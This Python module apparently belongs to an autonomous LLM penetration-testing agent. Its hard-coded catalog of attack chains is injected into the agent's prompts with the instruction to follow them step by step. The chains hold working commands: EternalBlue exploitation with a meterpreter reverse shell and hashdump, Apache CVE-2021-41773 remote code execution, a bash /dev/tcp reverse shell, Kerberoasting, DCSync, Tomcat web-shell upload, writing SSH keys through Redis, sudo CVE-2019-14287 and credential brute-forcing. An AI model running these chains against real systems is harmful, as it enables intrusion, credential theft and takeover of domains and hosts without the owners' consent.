"""Procedural RAG — structured attack technique chains (Improvement #9).

Standard RAG returns prose snippets (one CVE blurb, one tool tip).  An LLM
agent then has to assemble a multi-step procedure from those snippets on
the fly.  *Procedural* RAG instead retrieves an entire pre-validated
technique chain as a structured record:  a series of named steps with
tools, argument templates, success/failure indicators, and decision
branches.  When a hypothesis matches a chain, the agent follows the chain
end-to-end instead of improvising each step.

This module provides:

* :class:`TechniqueStep` and :class:`TechniqueChain` dataclasses.
* A small built-in *seed catalog* covering the highest-leverage offensive
  procedures (EternalBlue, GTFOBins SUID, Apache 2.4.49 path traversal,
  Kerberoasting, MSSQL xp_cmdshell, sudo CVE-2019-14287, SSH key reuse,
  default-creds → web shell, BloodHound → DCSync).  These are intentionally
  hard-coded so the system always has procedural priors even on a brand
  new install with no ingested KB.
* :func:`select_chains_for_hypothesis` — a cheap keyword/service/CVE
  matcher that returns the top-N applicable chains for a hypothesis.
* :func:`render_chains_for_prompt` — a compact rendering injected into the
  intel summary so every existing LLM phase planner picks up the
  procedural bias automatically.

The matcher is intentionally over-eager: it surfaces multiple chains and
lets the LLM (and the DecisionEngine) choose.  Keep cost tiny: this runs
every iteration.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any, Dict, Iterable, List, Optional, Sequence, Set


__all__ = [
    "TechniqueStep",
    "TechniqueChain",
    "TECHNIQUE_CATALOG",
    "select_chains_for_hypothesis",
    "render_chains_for_prompt",
]


# ─────────────────────────────────────────────────────────────────────────
# Data classes
# ─────────────────────────────────────────────────────────────────────────

@dataclass
class TechniqueStep:
    name:               str
    tool:               str
    args_template:      str
    success_indicators: List[str] = field(default_factory=list)
    failure_indicators: List[str] = field(default_factory=list)
    notes:              str       = ""

    def to_dict(self) -> dict:
        return {
            "name":               self.name,
            "tool":               self.tool,
            "args_template":      self.args_template,
            "success_indicators": list(self.success_indicators),
            "failure_indicators": list(self.failure_indicators),
            "notes":              self.notes,
        }


@dataclass
class TechniqueChain:
    chain_id:        str
    name:            str
    description:     str
    phase:           str                 # recon|vuln_id|exploit|privesc|lateral|post|cred_access|...
    applies_when:    Dict[str, List[str]] = field(default_factory=dict)
    steps:           List[TechniqueStep]  = field(default_factory=list)
    mitre:           List[str]            = field(default_factory=list)
    source:          str                  = "builtin"
    confidence:      float                = 0.85

    def to_dict(self) -> dict:
        return {
            "chain_id":     self.chain_id,
            "name":         self.name,
            "description":  self.description,
            "phase":        self.phase,
            "applies_when": {k: list(v) for k, v in (self.applies_when or {}).items()},
            "steps":        [s.to_dict() for s in self.steps],
            "mitre":        list(self.mitre),
            "source":       self.source,
            "confidence":   self.confidence,
        }


# ─────────────────────────────────────────────────────────────────────────
# Seed catalog — high-leverage built-in chains
# ─────────────────────────────────────────────────────────────────────────

TECHNIQUE_CATALOG: List[TechniqueChain] = [
    TechniqueChain(
        chain_id="smb_eternalblue_to_system",
        name="SMBv1 → EternalBlue → SYSTEM shell",
        description="Confirm SMBv1 + MS17-010 then exploit for SYSTEM-level RCE.",
        phase="exploit",
        applies_when={
            "services": ["smb", "smbv1", "microsoft-ds", "netbios"],
            "cves":     ["CVE-2017-0143", "CVE-2017-0144", "CVE-2017-0145",
                         "CVE-2017-0146", "CVE-2017-0147", "CVE-2017-0148"],
            "keywords": ["eternalblue", "ms17-010", "smbv1", "windows server 2008",
                         "windows 7"],
            "ports":    ["445", "139"],
        },
        steps=[
            TechniqueStep(
                name="confirm_vuln",
                tool="nmap",
                args_template="--script smb-vuln-ms17-010 -p445 {target}",
                success_indicators=["VULNERABLE", "MS17-010", "remote code execution"],
                failure_indicators=["Patched", "ERROR", "not vulnerable"],
                notes="Read-only — safe to confirm before exploitation.",
            ),
            TechniqueStep(
                name="exploit",
                tool="msfconsole",
                args_template=("-q -x \"use exploit/windows/smb/ms17_010_eternalblue;"
                               " set RHOSTS {target}; set LHOST {lhost};"
                               " set payload windows/x64/meterpreter/reverse_tcp; exploit -z\""),
                success_indicators=["Meterpreter session", "WIN", "session opened",
                                    "Won"],
                failure_indicators=["Exploit failed", "no session", "TIMEOUT"],
                notes="If host crashes (BSOD), retry once; tune named-pipe.",
            ),
            TechniqueStep(
                name="postex_loot",
                tool="meterpreter",
                args_template="hashdump; getsystem; sysinfo",
                success_indicators=["NT AUTHORITY\\\\SYSTEM", "hashdump"],
            ),
        ],
        mitre=["T1210", "T1078"],
    ),
    TechniqueChain(
        chain_id="linux_suid_gtfobins_privesc",
        name="Linux SUID enumeration → GTFOBins → root",
        description="Local SUID binary discovery and abuse via GTFOBins to escalate to root.",
        phase="privesc",
        applies_when={
            "services": [],
            "keywords": ["linux", "suid", "gtfobins", "privesc", "low-priv shell"],
        },
        steps=[
            TechniqueStep(
                name="enumerate_suid",
                tool="bash",
                args_template="find / -perm -4000 -type f 2>/dev/null",
                success_indicators=["/bin/", "/usr/bin/", "/sbin/"],
            ),
            TechniqueStep(
                name="cross_gtfobins",
                tool="lookup",
                args_template="https://gtfobins.github.io/#+suid",
                notes="Match each binary against GTFOBins SUID list.",
            ),
            TechniqueStep(
                name="abuse_binary",
                tool="bash",
                args_template="<binary>  -p '/bin/sh -p'   # exact form depends on binary",
                success_indicators=["uid=0(root)", "# "],
                failure_indicators=["permission denied", "not allowed"],
            ),
        ],
        mitre=["T1548.001"],
    ),
    TechniqueChain(
        chain_id="apache_2_4_49_traversal_rce",
        name="Apache 2.4.49 path traversal → RCE",
        description="CVE-2021-41773 traversal; if mod_cgi enabled, escalate to RCE.",
        phase="exploit",
        applies_when={
            "services": ["http", "apache"],
            "cves":     ["CVE-2021-41773", "CVE-2021-42013"],
            "keywords": ["apache 2.4.49", "apache 2.4.50", "path traversal",
                         "mod_cgi", "alias /cgi-bin"],
            "ports":    ["80", "443", "8080"],
        },
        steps=[
            TechniqueStep(
                name="confirm_traversal",
                tool="curl",
                args_template="-s --path-as-is 'http://{target}/icons/.%2e/%2e%2e/%2e%2e/etc/passwd'",
                success_indicators=["root:x:0:0", ":/bin/bash"],
                failure_indicators=["404", "403", "Forbidden"],
            ),
            TechniqueStep(
                name="confirm_cgi_rce",
                tool="curl",
                args_template=("-s --path-as-is -d 'echo Content-Type: text/plain; echo; id'"
                               " 'http://{target}/cgi-bin/.%2e/%2e%2e/bin/sh'"),
                success_indicators=["uid=", "gid="],
                failure_indicators=["404", "Forbidden"],
                notes="Requires mod_cgi enabled — fall back to read-only traversal otherwise.",
            ),
            TechniqueStep(
                name="upgrade_shell",
                tool="bash",
                args_template="bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            ),
        ],
        mitre=["T1190"],
    ),
    TechniqueChain(
        chain_id="ad_kerberoasting",
        name="AD Kerberoasting → offline crack",
        description="Request service tickets for SPN-bearing accounts and crack offline.",
        phase="cred_access",
        applies_when={
            "services": ["ldap", "kerberos", "smb", "rdp"],
            "keywords": ["active directory", "kerberos", "spn", "domain controller"],
            "ports":    ["88", "389", "445"],
        },
        steps=[
            TechniqueStep(
                name="request_tickets",
                tool="impacket-GetUserSPNs",
                args_template="{domain}/{user}:{password} -dc-ip {dc_ip} -request -outputfile spns.tgs",
                success_indicators=["$krb5tgs$23$"],
                failure_indicators=["KDC_ERR", "KRB_AP_ERR"],
            ),
            TechniqueStep(
                name="crack_offline",
                tool="hashcat",
                args_template="-m 13100 spns.tgs /usr/share/wordlists/rockyou.txt",
                success_indicators=["Status.........: Cracked"],
            ),
        ],
        mitre=["T1558.003"],
    ),
    TechniqueChain(
        chain_id="mssql_xp_cmdshell_rce",
        name="MSSQL → xp_cmdshell → OS command",
        description="Use SQL login to enable xp_cmdshell and run OS commands.",
        phase="exploit",
        applies_when={
            "services": ["mssql", "ms-sql-s"],
            "keywords": ["mssql", "sql server", "xp_cmdshell"],
            "ports":    ["1433"],
        },
        steps=[
            TechniqueStep(
                name="login",
                tool="impacket-mssqlclient",
                args_template="{user}:{password}@{target} -windows-auth",
                success_indicators=["SQL>", "ENVCHANGE"],
                failure_indicators=["Login failed", "ERROR"],
            ),
            TechniqueStep(
                name="enable_xp_cmdshell",
                tool="mssql",
                args_template="EXEC sp_configure 'show advanced',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;",
                success_indicators=["Configuration option"],
                failure_indicators=["permission denied"],
            ),
            TechniqueStep(
                name="execute",
                tool="mssql",
                args_template="EXEC xp_cmdshell 'whoami'",
                success_indicators=["nt service", "nt authority"],
            ),
        ],
        mitre=["T1059", "T1190"],
    ),
    TechniqueChain(
        chain_id="sudo_cve_2019_14287",
        name="sudo -u#-1 → root (CVE-2019-14287)",
        description="Sudo before 1.8.28 with `runas ALL` permits uid=-1, executing as root.",
        phase="privesc",
        applies_when={
            "services": [],
            "cves":     ["CVE-2019-14287"],
            "keywords": ["sudo", "runas", "uid -1", "1.8.27"],
        },
        steps=[
            TechniqueStep(
                name="check_sudo_version",
                tool="bash",
                args_template="sudo -V | head -1",
                success_indicators=["Sudo version 1.8.2", "1.8.27", "1.8.0"],
            ),
            TechniqueStep(
                name="check_runas",
                tool="bash",
                args_template="sudo -l",
                success_indicators=["(ALL, !root)", "(ALL : ALL)", "NOPASSWD"],
            ),
            TechniqueStep(
                name="exploit",
                tool="bash",
                args_template="sudo -u#-1 /bin/bash",
                success_indicators=["uid=0(root)", "# "],
            ),
        ],
        mitre=["T1548.003"],
    ),
    TechniqueChain(
        chain_id="ssh_key_reuse_lateral",
        name="SSH key harvest → lateral movement",
        description="After initial shell, harvest SSH keys and reuse against other hosts.",
        phase="lateral",
        applies_when={
            "services": ["ssh"],
            "keywords": ["ssh", "id_rsa", "authorized_keys", "lateral"],
            "ports":    ["22"],
        },
        steps=[
            TechniqueStep(
                name="harvest_keys",
                tool="bash",
                args_template="find /home /root -name 'id_*' -o -name 'authorized_keys' 2>/dev/null",
                success_indicators=["id_rsa", "id_ed25519", "authorized_keys"],
            ),
            TechniqueStep(
                name="enumerate_known_hosts",
                tool="bash",
                args_template="cat /home/*/.ssh/known_hosts /root/.ssh/known_hosts 2>/dev/null",
            ),
            TechniqueStep(
                name="ssh_pivot",
                tool="ssh",
                args_template="-i {key} {user}@{next_host}",
                success_indicators=["Last login", "$ ", "# "],
                failure_indicators=["Permission denied", "publickey"],
            ),
        ],
        mitre=["T1021.004", "T1552.004"],
    ),
    TechniqueChain(
        chain_id="bloodhound_dcsync",
        name="BloodHound enum → DA path → DCSync",
        description="Map AD with BloodHound, find shortest path to DA, abuse DCSync.",
        phase="lateral",
        applies_when={
            "services": ["ldap", "smb", "kerberos"],
            "keywords": ["bloodhound", "active directory", "dcsync", "domain admin",
                         "shortest path"],
            "ports":    ["389", "445"],
        },
        steps=[
            TechniqueStep(
                name="collect",
                tool="bloodhound-python",
                args_template="-u {user} -p {password} -d {domain} -ns {dc_ip} -c All",
                success_indicators=["Compressing collected data"],
            ),
            TechniqueStep(
                name="analyze",
                tool="bloodhound",
                args_template="-> shortest path to Domain Admins",
                notes="Use the GUI; check edges: GenericAll, WriteDACL, AddMember, etc.",
            ),
            TechniqueStep(
                name="dcsync",
                tool="impacket-secretsdump",
                args_template="{domain}/{compromised_user}:{password}@{dc_ip} -just-dc",
                success_indicators=["Administrator:500:", "krbtgt:502:"],
            ),
        ],
        mitre=["T1003.006"],
    ),
    TechniqueChain(
        chain_id="default_creds_to_web_shell",
        name="Default web creds → admin → web shell",
        description="Try default credentials on common web admin panels and upload a shell.",
        phase="exploit",
        applies_when={
            "services": ["http", "https", "tomcat", "jenkins", "phpmyadmin",
                         "wordpress", "joomla", "drupal"],
            "keywords": ["default credentials", "admin panel", "tomcat manager",
                         "jenkins", "wp-admin", "/manager/html"],
            "ports":    ["80", "443", "8080", "8443"],
        },
        steps=[
            TechniqueStep(
                name="try_defaults",
                tool="hydra",
                args_template="-L users.txt -P passwords.txt {target} http-get /admin",
                success_indicators=["login:", "valid pair"],
                failure_indicators=["0 valid passwords"],
            ),
            TechniqueStep(
                name="upload_shell",
                tool="curl",
                args_template="-u {user}:{pass} -T shell.war 'http://{target}/manager/text/deploy?path=/x'",
                success_indicators=["OK - Deployed application"],
            ),
            TechniqueStep(
                name="trigger_shell",
                tool="curl",
                args_template="'http://{target}/x/'  # then connect listener",
                success_indicators=["whoami", "$ "],
            ),
        ],
        mitre=["T1110.001", "T1505.003"],
    ),
    TechniqueChain(
        chain_id="redis_unauth_to_shell",
        name="Redis unauth → SSH key write → shell",
        description="Unauthenticated Redis writable to disk → write authorized_keys → SSH in.",
        phase="exploit",
        applies_when={
            "services": ["redis"],
            "keywords": ["redis", "unauthenticated", "rogue redis"],
            "ports":    ["6379"],
        },
        steps=[
            TechniqueStep(
                name="confirm_unauth",
                tool="redis-cli",
                args_template="-h {target} ping",
                success_indicators=["PONG"],
                failure_indicators=["NOAUTH", "AUTH"],
            ),
            TechniqueStep(
                name="write_authorized_keys",
                tool="redis-cli",
                args_template=("-h {target} CONFIG SET dir /home/redis/.ssh; "
                               "-h {target} CONFIG SET dbfilename authorized_keys; "
                               "-h {target} SET x \"\\n\\n{ssh_pubkey}\\n\\n\"; "
                               "-h {target} SAVE"),
                success_indicators=["OK"],
                failure_indicators=["read-only", "ERR"],
            ),
            TechniqueStep(
                name="ssh_in",
                tool="ssh",
                args_template="-i {key} redis@{target}",
                success_indicators=["$ ", "# "],
            ),
        ],
        mitre=["T1078"],
    ),

    # ── Foothold primers (post-mortem 2026-04-19) ─────────────────────────
    # Cheap, low-noise unauth probes that resolve most beginner/lab boxes
    # in <60s.  These should run FIRST — before any aggressive scanner —
    # whenever their target service is open.  Each is read-only on its
    # confirm step; only the second step has any side-effect.

    TechniqueChain(
        chain_id="ftp_anonymous_login",
        name="Anonymous FTP → file harvest",
        description="vsftpd / proftpd / pure-ftpd often ship with anonymous read enabled — try it before anything else when port 21 is open.",
        phase="exploit",
        applies_when={
            "services": ["ftp", "vsftpd", "proftpd", "pure-ftpd", "filezilla"],
            "keywords": ["ftp", "vsftpd", "anonymous"],
            "ports":    ["21"],
        },
        steps=[
            TechniqueStep(
                name="confirm_anon",
                tool="nmap",
                args_template="--script ftp-anon -p21 {target}",
                success_indicators=["Anonymous FTP login allowed", "FTP code 230"],
                failure_indicators=["Login incorrect", "530", "not allowed"],
                notes="Read-only nmap NSE — safe.",
            ),
            TechniqueStep(
                name="harvest",
                tool="curl",
                args_template="-s -u 'anonymous:anonymous@' ftp://{target}/ --list-only",
                success_indicators=[".txt", "user.txt", "flag", "id_rsa", "backup"],
                notes="Look for SSH keys, scripts, flags, password files.",
            ),
        ],
        mitre=["T1078.001", "T1083"],
        confidence=0.9,
    ),

    TechniqueChain(
        chain_id="rsh_rlogin_default_root",
        name="r-services (rsh/rlogin) → unauth root",
        description="Ports 512/513/514 left open on labs almost always allow rsh/rlogin as root with no password — single-step instant shell.",
        phase="exploit",
        applies_when={
            "services": ["rsh", "rlogin", "rexec", "shell", "login", "exec"],
            "keywords": ["r-services", "rexec", "rsh", "rlogin"],
            "ports":    ["512", "513", "514"],
        },
        steps=[
            TechniqueStep(
                name="rlogin_root",
                tool="rlogin",
                args_template="-l root {target}",
                success_indicators=["#", "$", "Last login", "id="],
                failure_indicators=["denied", "refused", "incorrect"],
                notes="Try -l root first, then -l nobody, -l guest, -l bin.",
            ),
            TechniqueStep(
                name="rsh_id",
                tool="rsh",
                args_template="-l root {target} id",
                success_indicators=["uid=0", "root", "wheel"],
            ),
        ],
        mitre=["T1078.001", "T1021"],
        confidence=0.85,
    ),

    TechniqueChain(
        chain_id="snmp_public_v2c_walk",
        name="SNMPwalk public → users / processes / running services",
        description="SNMP v1/v2c with default community 'public' leaks usernames, running processes, installed software, ARP tables — gold for foothold planning.",
        phase="recon",
        applies_when={
            "services": ["snmp"],
            "keywords": ["snmp", "community string"],
            "ports":    ["161"],
        },
        steps=[
            TechniqueStep(
                name="walk_public",
                tool="snmpwalk",
                args_template="-v 2c -c public {target}",
                success_indicators=["SNMPv2-MIB", "iso.3.6.1", "STRING:", "INTEGER:"],
                failure_indicators=["Timeout", "No Response", "no such name"],
                notes="If 'public' fails, try 'private', 'community', 'manager'.",
            ),
            TechniqueStep(
                name="enumerate_users",
                tool="snmpwalk",
                args_template="-v 2c -c public {target} 1.3.6.1.4.1.77.1.2.25",
                success_indicators=["STRING:", "user", "Administrator"],
                notes="Windows user accounts via LanMgr-Mib-II.",
            ),
        ],
        mitre=["T1046", "T1087"],
        confidence=0.9,
    ),

    TechniqueChain(
        chain_id="db_default_creds_quick",
        name="MySQL/Postgres/MongoDB/MSSQL default-creds primer",
        description="Try empty/default creds against exposed DB servers before brute-forcing — most lab boxes leave at least one of root/'', postgres/postgres, sa/sa, or no-auth Mongo.",
        phase="exploit",
        applies_when={
            "services": ["mysql", "postgresql", "postgres", "mongodb", "mssql",
                         "ms-sql-s", "redis"],
            "keywords": ["default credentials", "no password", "weak auth"],
            "ports":    ["3306", "5432", "27017", "1433", "6379"],
        },
        steps=[
            TechniqueStep(
                name="mysql_root_empty",
                tool="mysql",
                args_template="-h {target} -u root -e 'SHOW DATABASES;'",
                success_indicators=["information_schema", "Database"],
                failure_indicators=["Access denied", "ER_ACCESS_DENIED"],
            ),
            TechniqueStep(
                name="postgres_default",
                tool="psql",
                args_template="-h {target} -U postgres -c '\\l' -W postgres",
                success_indicators=["List of databases", "template0"],
                failure_indicators=["authentication failed", "FATAL"],
            ),
            TechniqueStep(
                name="mongo_unauth",
                tool="mongosh",
                args_template="--host {target} --eval 'db.adminCommand({listDatabases:1})'",
                success_indicators=["databases", "totalSize"],
                failure_indicators=["Unauthorized", "auth failed"],
            ),
            TechniqueStep(
                name="mssql_sa_blank",
                tool="impacket-mssqlclient",
                args_template="sa@{target} -windows-auth",
                success_indicators=["SQL>", "Master"],
                failure_indicators=["Login failed", "[-]"],
            ),
        ],
        mitre=["T1078.001", "T1110.001"],
        confidence=0.85,
    ),

    TechniqueChain(
        chain_id="smb_anonymous_enum",
        name="SMB anonymous null-session → share / user enum",
        description="Null-session SMB enum still works on a surprising number of older Windows / Samba boxes — list shares, users, RID-cycle.",
        phase="recon",
        applies_when={
            "services": ["smb", "microsoft-ds", "netbios-ssn"],
            "keywords": ["smb", "samba", "netbios"],
            "ports":    ["139", "445"],
        },
        steps=[
            TechniqueStep(
                name="list_shares",
                tool="smbclient",
                args_template="-L //{target}/ -N",
                success_indicators=["Sharename", "IPC$", "Disk", "Comment"],
                failure_indicators=["NT_STATUS_ACCESS_DENIED", "session setup failed"],
            ),
            TechniqueStep(
                name="enum4linux",
                tool="enum4linux-ng",
                args_template="-A {target}",
                success_indicators=["Users via", "Domain Sid", "Share Enumeration",
                                    "RID Cycling"],
            ),
            TechniqueStep(
                name="rid_cycle",
                tool="crackmapexec",
                args_template="smb {target} --rid-brute 4000",
                success_indicators=["SidTypeUser", "Administrator", "Guest"],
            ),
        ],
        mitre=["T1087.002", "T1135"],
        confidence=0.85,
    ),

    TechniqueChain(
        chain_id="telnet_default_creds",
        name="Telnet → default / blank credentials",
        description="Open telnet ports on labs frequently accept root/root, admin/admin, or blank passwords — one connection attempt per pair, watch for prompt.",
        phase="exploit",
        applies_when={
            "services": ["telnet"],
            "keywords": ["telnet", "cleartext"],
            "ports":    ["23"],
        },
        steps=[
            TechniqueStep(
                name="hydra_short_list",
                tool="hydra",
                args_template=("-L /usr/share/seclists/Usernames/top-usernames-shortlist.txt "
                               "-P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt "
                               "-t 4 -f {target} telnet"),
                success_indicators=["[23][telnet] host:", "login:", "password:"],
                failure_indicators=["0 valid passwords found", "could not connect"],
                notes="Stop on first success (-f); cap to top-100 to stay quiet.",
            ),
        ],
        mitre=["T1110.001"],
        confidence=0.7,
    ),
]


# ─────────────────────────────────────────────────────────────────────────
# Matching
# ─────────────────────────────────────────────────────────────────────────

_RE_CVE = re.compile(r"CVE-\d{4}-\d{4,7}", re.IGNORECASE)


def _flatten(items: Iterable[Any]) -> List[str]:
    out: List[str] = []
    for x in items or []:
        if x is None:
            continue
        out.append(str(x).lower())
    return out


def _hypothesis_text(h: Any) -> str:
    if isinstance(h, dict):
        parts = [
            h.get("statement", ""),
            " ".join(str(e) for e in h.get("required_evidence", []) or []),
            " ".join(
                str(a.get("rationale", "")) + " " + str(a.get("target", ""))
                if isinstance(a, dict) else str(a)
                for a in h.get("recommended_next_actions", []) or []
            ),
            h.get("attack_phase", ""),
            h.get("mitre_technique", "") or "",
        ]
    else:
        parts = [
            getattr(h, "statement", ""),
            " ".join(str(e) for e in (getattr(h, "required_evidence", []) or [])),
            " ".join(
                str(a.get("rationale", "")) + " " + str(a.get("target", ""))
                if isinstance(a, dict) else str(a)
                for a in (getattr(h, "recommended_next_actions", []) or [])
            ),
            getattr(h, "attack_phase", "") or "",
            getattr(h, "mitre_technique", "") or "",
        ]
    return " ".join(parts).lower()


def _score_chain(chain: TechniqueChain, *,
                 hyp_text: str, services: Set[str], cves: Set[str],
                 ports: Set[str], mitre: Set[str]) -> int:
    """Cheap overlap score — higher = more applicable."""
    aw = chain.applies_when or {}
    score = 0
    for svc in _flatten(aw.get("services", [])):
        if svc in services:
            score += 4
        if svc and svc in hyp_text:
            score += 2
    for cve in _flatten(aw.get("cves", [])):
        if cve.upper() in cves:
            score += 6
        if cve in hyp_text:
            score += 3
    for kw in _flatten(aw.get("keywords", [])):
        if kw and kw in hyp_text:
            score += 2
    for port in _flatten(aw.get("ports", [])):
        if port in ports:
            score += 2
    for m in chain.mitre or []:
        if m.lower() in mitre:
            score += 3
    return score


def select_chains_for_hypothesis(
    hypothesis:  Any,
    intel:       Dict[str, Any],
    *,
    catalog:     Optional[Sequence[TechniqueChain]] = None,
    top_n:       int = 3,
    min_score:   int = 4,
) -> List[TechniqueChain]:
    """Return the top-N applicable chains for the given hypothesis."""
    cat = list(catalog or TECHNIQUE_CATALOG)
    intel = intel or {}

    services: Set[str] = set()
    for s in intel.get("services", {}).values() if isinstance(intel.get("services"), dict) else []:
        if isinstance(s, dict):
            n = (s.get("name") or s.get("service") or "").lower()
            if n:
                services.add(n)
        else:
            services.add(str(s).lower())
    for t in intel.get("technologies", []) or []:
        services.add(str(t).lower())

    ports = {str(p) for p in (intel.get("open_ports") or [])}

    cves: Set[str] = {str(c).upper() for c in (intel.get("cves") or [])}

    hyp_text = _hypothesis_text(hypothesis)
    cves.update(m.group(0).upper() for m in _RE_CVE.finditer(hyp_text))

    mitre: Set[str] = set()
    if isinstance(hypothesis, dict):
        if hypothesis.get("mitre_technique"):
            mitre.add(str(hypothesis["mitre_technique"]).lower())
    else:
        mt = getattr(hypothesis, "mitre_technique", None)
        if mt:
            mitre.add(str(mt).lower())

    scored = []
    for chain in cat:
        s = _score_chain(chain, hyp_text=hyp_text, services=services,
                         cves=cves, ports=ports, mitre=mitre)
        if s >= min_score:
            scored.append((s, chain))
    scored.sort(key=lambda t: (t[0], t[1].confidence), reverse=True)
    return [c for _, c in scored[:top_n]]


# ─────────────────────────────────────────────────────────────────────────
# Rendering for prompt injection
# ─────────────────────────────────────────────────────────────────────────

def render_chains_for_prompt(chains: Sequence[TechniqueChain],
                             *, max_chains: int = 2,
                             max_steps: int = 6) -> str:
    if not chains:
        return ""
    lines = ["=== PROCEDURAL TECHNIQUE CHAINS (apply if conditions still hold) ==="]
    for chain in list(chains)[:max_chains]:
        lines.append(f"▶ {chain.name}  [{chain.phase}]  conf={chain.confidence:.2f}  "
                     f"mitre={','.join(chain.mitre) or '-'}")
        lines.append(f"  {chain.description}")
        for i, step in enumerate(chain.steps[:max_steps], 1):
            lines.append(f"   {i}. {step.name}: {step.tool} {step.args_template}")
            if step.success_indicators:
                lines.append(f"      ✓ on success: {', '.join(step.success_indicators[:3])}")
            if step.failure_indicators:
                lines.append(f"      ✗ on failure: {', '.join(step.failure_indicators[:3])}")
    lines.append(
        "Follow these step-by-step; only deviate if a step's failure indicators "
        "fire or evidence contradicts the chain's preconditions."
    )
    return "\n".join(lines)
